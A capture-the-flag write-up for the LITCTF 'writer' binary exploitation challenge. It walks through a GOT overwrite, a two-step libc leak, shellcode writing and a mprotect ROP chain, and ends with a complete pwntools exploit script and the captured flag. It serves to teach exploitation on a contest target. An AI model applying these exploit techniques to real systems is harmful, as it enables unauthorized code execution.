# writer
![](https://img.shields.io/badge/category-pwn-blue)
![](https://img.shields.io/badge/solves-30-orange)

## Description
Write somewhere.

Connect with `nc litctf.live 31790`

[writer.zip](https://drive.google.com/uc?export=download&id=1vdHjEz7BYW8xmP5w1qNYvmPRbZqdQ9Zg)

## Solution
Looking at the source code, it applies as seccomp filter banning `execve`, preventing us from getting remote code execution.

It then reads in a pointer from stdin, and prints 4 bytes from that location. Then it asks for 4 more bytes of user input to write to another location. After that, it reads `0x80` bytes onto the stack, repeats it, and exits.

```
$ checksec writer
[*] '~/lit/writer/writer'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
 ```

Since the flag is not loaded anywhere in memory, there is nothing we can do in just one run of the program. Because relro is partial and the program is not positionally independent, we can overwrite the final exit call to instead be main, giving us near-infinite writes.

For the first iteration, we should try to leak libc, as that would give us a lot more room to work with. We can do this by leaking the address of `puts`, which is at a fixed offset from the start of libc. Then, we should overwrite `exit` with main's address. To get the locations to overwrite, we can just check the addresses of `puts` and `exit` in the `got.plt` section, in Ghidra. When resolving functions in partial relro mode, the program checks if a valid address exists in the `got.plt` table, and jumps to it if so.
```py
from pwn import *

context.arch = 'amd64'

ADDR_PUTS_GPLT = 0x404028
ADDR_EXIT_GPLT = 0x404060
ADDR_MAIN = 0x401264

# p = process("./writer")
p = remote("litctf.live", 31790)

p.recvuntil(b'where?\n')
p.sendline(str(ADDR_PUTS_GPLT).encode('utf-8'))
p.recvuntil(b'there:\n')
PUTS_LIBC = int(p.recv(1024).split(b'\n')[0].decode('utf-8')) & 0xffffffff
log.info("puts at: " + hex(PUTS_LIBC))
LIBC_BASE = PUTS_LIBC - 0x875a0 # https://libc.blukat.me/d/libc6_2.31-0ubuntu9_amd64.symbols
log.info("libc at: " + hex(LIBC_BASE))
assert(LIBC_BASE & 0xfff == 0)

log.info("getting infinite writes...")
p.sendline(str(ADDR_EXIT_GPLT).encode('utf-8'))
p.sendline(str(ADDR_MAIN).encode('utf-8'))
p.recvuntil(b'challenge?\n')
p.sendline(b'nobody asked')

pause()
```

The issue is that since our information leak is only 4 bytes, we only got the lower 4 bytes of libc. To get the higher 4 bytes, we have to leak again.
```py
p.recvuntil(b'where?\n')
p.sendline(str(ADDR_PUTS_GPLT+4).encode('utf-8'))
p.recvuntil(b'there:\n')
tophalf = int(p.recv(1024).split(b'\n')[0].decode('utf-8'))
LIBC_BASE = (tophalf << 32) + LIBC_BASE
log.info("libc at: " + hex(LIBC_BASE))
assert(LIBC_BASE & 0xfff == 0)
p.sendline(str(ADDR_EXIT_GPLT).encode('utf-8'))
p.sendline(str(ADDR_MAIN).encode('utf-8'))
p.recvuntil(b'challenge?\n')
p.sendline(b'nobody asked')

pause()
```

Great, we now have the entire libc at our disposal to call, but only by replacing specific functions. Instead of worrying about that, let's first create some shellcode to read and print the flag. Due to no rwx segment protections, the shellcode can't be executed immediately, but if we can call `mprotect` somehow, that would let our shellcode run.

I decided to create shellcode at the address 0x404600, as it was an unused and writable section. The first 9 bytes were "flag.txt\x00", and then followed by shellcode (so the shellcode itself starts at 0x404609). A 64 bit syscall table can be found [here](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) to help figure out what the registers should contain.
```asm
 move rdi, 0x404600;
 xor esi, esi;
 xor edx, edx;
 mov eax, 2;
 syscall ;  <=== int $rax = open("flag.txt", 0, 0);
 mov edi, eax;
 mov esi, 0x404500;
 mov edx, 80;
 xor eax, eax;
 syscall ;  <== read(fd, 0x404500, 80);
 mov edi, 1;
 mov esi, 0x404500;
 mov edx, 80;
 mov eax, 1;
 syscall ;  <== write(stdout, 0x404500, 80);
```

Then we have to write the shellcode 4 bytes at a time, to the designated memory location.
```py
shellcode = b'flag.txt\x00' + asm("""  mov rdi, 0x404600;
 xor esi, esi;
 xor edx, edx;
 mov eax, 2;
 syscall ;
 mov edi, eax;
 mov esi, 0x404500;
 mov edx, 80;
 xor eax, eax;
 syscall ;
 mov edi, 1;
 mov esi, 0x404500;
 mov edx, 80;
 mov eax, 1;
 syscall ;""")
if len(shellcode) % 4 != 0: shellcode += b'\x00'*(4 - (len(shellcode) % 4)) # padding
SHELLCODE_ADDR = 0x404600

log.info("writing shellcode")
i = 0
while True:
    sc = shellcode[i*4:i*4+4]
    if len(sc) == 0:
        break
    p.recvuntil(b'where?\n')
    p.sendline(str(ADDR_PUTS_GPLT).encode('utf-8'))
    p.recvuntil(b'where?\n')
    p.sendline(str(SHELLCODE_ADDR+i*4).encode('utf-8'))
    p.recvuntil(b'What?\n')
    p.sendline(str(int.from_bytes(sc, 'little')).encode('utf-8'))
    p.recvuntil(b'challenge?\n')
    p.sendline(b'nobody asked')
    i += 1
log.info("shellcode done writing")
pause()
```

Next is to `mprotect` our shellcode. We'd need to execute `mprotect(0x404000, len, 5 or 7)`. There's no function to hijack where we can control all 3 arguments, so I started thinking about using ROP to set up the arguments. Since main doesn't return, we'd have to hijack `exit` on the last iteration to point to the start of our rop chain, and then continue to the rest of the chain in the `0x80` stack read.

For this rop chain, we need:
```asm
pop rdi; first parameter
pop rsi; second parameter
pop rdx; third paramether
call mprotect
call 0x404600
```
Using ropsearch, we can find all the required gadgets:
```asm
gdb-peda$ ropsearch 'pop rdi'
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x0040143b : (b'5fc3')  pop rdi; ret
gdb-peda$ ropsearch 'pop rsi'
Searching for ROP gadget: 'pop rsi' in: binary ranges
0x00401439 : (b'5e415fc3')      pop rsi; pop r15; ret
gdb-peda$ ropsearch 'pop rdx'
Searching for ROP gadget: 'pop rdx' in: binary ranges
Not found
gdb-peda$ ropsearch 'pop rdx' libc
Searching for ROP gadget: 'pop rdx' in: libc ranges
0x00007fa32594d6d6 : (b'5a5bc3')        pop rdx; pop rbx; ret
```
Normally, the `pop rdx` gadget would be inaccessible because the location of libc is random, but since we leaked its base address earlier, we can use it. In this specific instance, libc's base address was `0x00007fa3257eb000`, and subtracting it from the address of the gadget revealed that the gadget is always at `LIBC_BASE + 0x1626d6`.

Finally, the address of `mprotect` can be found by checking the [libc.blukat.me entry for this specific libc](https://libc.blukat.me/d/libc6_2.31-0ubuntu9_amd64.symbols). It's at `LIBC_BASE + 0x11b970`.

This makes our final rop chain:
```py
log.info("preparing rop chain")
rop = b''
rop += p64(LIBC_BASE + 0x1626d6) # pop rdx; pop rbx; ret
rop += p64(7)
rop += p64(0)
rop += p64(0x00401439) # pop rsi; pop r15; ret
rop += p64(0x1000)
rop += p64(0)
rop += p64(0x0040143b) # pop rdi; ret
rop += p64(0x00404000)
rop += p64(LIBC_BASE + 0x11b970) # mprotect(0x00404000, 0x1000, READ | WRITE | EXEC)
rop += p64(SHELLCODE_ADDR+9)
```

With a typical rop chain, we can simply drop this onto the stack, but because there is no `ret`, we have to hijack the `call exit(0)` instead. Because of this, we have to be careful that the stack is properly set up. I overwrote `exit` with the `pop rdi` gadget to be able to inspect the stack when it exits, making sure there is a smooth transition to the actual rop chain.
```py
log.info("writing rop chain")
p.recvuntil(b'where?\n')
p.sendline(str(ADDR_PUTS_GPLT).encode('utf-8'))
p.recvuntil(b'where?\n')
p.sendline(str(ADDR_EXIT_GPLT).encode('utf-8'))
p.recvuntil(b'What?\n')
p.sendline(str(0x0040143b).encode('utf-8')) # pop rdi; ret
p.recvuntil(b'challenge?\n')
p.sendline(rop)
log.info("done writing rop chain")
pause()
p.interactive()
```

Hopping into GDB and setting a breakpoint right before the exit, we can follow the chain to see if it works.

![](https://user-images.githubusercontent.com/62577178/182061491-f51a039c-1dd7-4b80-8815-8b075ed52636.png)

It's a good thing there's a `pop rdi`! Turns out, when calling `exit`, this extra value ends up on the stack, which is not part of our rop chain, so it needs to get popped. Had there been no extra value to pop, the `pop rdi; ret` gadget could have been replaced with a `ret` gadget.

Stepping through our rop chain further, until right before `mprotect`, we can see that all the registers are set up for a `mprotect` call, and after it returns, it will return to our shellcode.

![](https://user-images.githubusercontent.com/62577178/182061954-0710daec-9865-48c9-ac4d-be118fd8ec25.png)

Looks like the rop chain worked, time to test it on the actual server.
```
$ python test.py
[+] Opening connection to litctf.live on port 31790: Done
[*] puts at: 0xd5c345a0
[*] libc at: 0xd5bad000
[*] getting infinite writes...
[*] Paused (press any to continue)
[*] libc at: 0x7f99d5bad000
[*] Paused (press any to continue)
[*] writing shellcode
[*] shellcode done writing
[*] Paused (press any to continue)
[*] preparing rop chain
[*] writing rop chain
[*] done writing rop chain
[*] Paused (press any to continue)
[*] Switching to interactive mode

You said:
\xd6\xf6\xd0\xd5\x99\x7f
LITCTF{g3n3r1c_fl4g_f0r_wr1t3r_bu7_m0r3_r4nd0m_s0_u_d0n7_gu3ss}
\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
```

Flag: `LITCTF{g3n3r1c_fl4g_f0r_wr1t3r_bu7_m0r3_r4nd0m_s0_u_d0n7_gu3ss}`

## Full exploit code
```py
from pwn import *

context.arch = 'amd64'

ADDR_PUTS_GPLT = 0x404028
ADDR_EXIT_GPLT = 0x404060
ADDR_MAIN = 0x401264

#p = process("./writer")
p = remote("litctf.live", 31790)

p.recvuntil(b'where?\n')
p.sendline(str(ADDR_PUTS_GPLT).encode('utf-8'))
p.recvuntil(b'there:\n')
PUTS_LIBC = int(p.recv(1024).split(b'\n')[0].decode('utf-8')) & 0xffffffff
log.info("puts at: " + hex(PUTS_LIBC))
LIBC_BASE = PUTS_LIBC - 0x875a0 # https://libc.blukat.me/d/libc6_2.31-0ubuntu9_amd64.symbols
log.info("libc at: " + hex(LIBC_BASE))
assert(LIBC_BASE & 0xfff == 0)

log.info("getting infinite writes...")
p.sendline(str(ADDR_EXIT_GPLT).encode('utf-8'))
p.sendline(str(ADDR_MAIN).encode('utf-8'))
p.recvuntil(b'challenge?\n')
p.sendline(b'nobody asked')

pause()

p.recvuntil(b'where?\n')
p.sendline(str(ADDR_PUTS_GPLT+4).encode('utf-8'))
p.recvuntil(b'there:\n')
tophalf = int(p.recv(1024).split(b'\n')[0].decode('utf-8'))
LIBC_BASE = (tophalf << 32) + LIBC_BASE
log.info("libc at: " + hex(LIBC_BASE))
assert(LIBC_BASE & 0xfff == 0)
p.sendline(str(ADDR_EXIT_GPLT).encode('utf-8'))
p.sendline(str(ADDR_MAIN).encode('utf-8'))
p.recvuntil(b'challenge?\n')
p.sendline(b'nobody asked')

pause()

shellcode = b'flag.txt\x00' + asm("""  mov rdi, 0x404600;
 xor esi, esi;
 xor edx, edx;
 mov eax, 2;
 syscall ;
 mov edi, eax;
 mov esi, 0x404500;
 mov edx, 80;
 xor eax, eax;
 syscall ;
 mov edi, 1;
 mov esi, 0x404500;
 mov edx, 80;
 mov eax, 1;
 syscall ;""")
if len(shellcode) % 4 != 0: shellcode += b'\x00'*(4 - (len(shellcode) % 4)) # padding
SHELLCODE_ADDR = 0x404600

log.info("writing shellcode")
i = 0
while True:
    sc = shellcode[i*4:i*4+4]
    if len(sc) == 0:
        break
    p.recvuntil(b'where?\n')
    p.sendline(str(ADDR_PUTS_GPLT).encode('utf-8'))
    p.recvuntil(b'where?\n')
    p.sendline(str(SHELLCODE_ADDR+i*4).encode('utf-8'))
    p.recvuntil(b'What?\n')
    p.sendline(str(int.from_bytes(sc, 'little')).encode('utf-8'))
    p.recvuntil(b'challenge?\n')
    p.sendline(b'nobody asked')
    i += 1
log.info("shellcode done writing")
pause()


log.info("preparing rop chain")
rop = b''
rop += p64(LIBC_BASE + 0x1626d6) # pop rdx; pop rbx; ret
rop += p64(7)
rop += p64(0)
rop += p64(0x00401439) # pop rsi; pop r15; ret
rop += p64(0x1000)
rop += p64(0)
rop += p64(0x0040143b) # pop rdi; ret
rop += p64(0x00404000)
rop += p64(LIBC_BASE + 0x11b970) # mprotect(0x00404000, 0x1000, READ | WRITE | EXEC)
rop += p64(SHELLCODE_ADDR+9)

log.info("writing rop chain")
p.recvuntil(b'where?\n')
p.sendline(str(ADDR_PUTS_GPLT).encode('utf-8'))
p.recvuntil(b'where?\n')
p.sendline(str(ADDR_EXIT_GPLT).encode('utf-8'))
p.recvuntil(b'What?\n')
p.sendline(str(0x0040143b).encode('utf-8')) # pop rdi; ret
p.recvuntil(b'challenge?\n')
p.sendline(rop)
log.info("done writing rop chain")
pause()
p.interactive()
```

## Afterthoughts
The first time solving this question, I stack pivoted to another empty memory region to execute my rop chain, because I didn't realize that 0x80 bytes was more than enough to fit this rop chain. Getting rid of that saved ~40 lines off my exploit.

Also, it should be possible to do the open/read/write through rop as well, instead of using shellcode. For this solution, a stack pivot would absolutely be required, as we would have to set up 3 function calls with 3 parameters each. Had I immediately realized that I had to use rop, I likely would have done this instead of using shellcode.
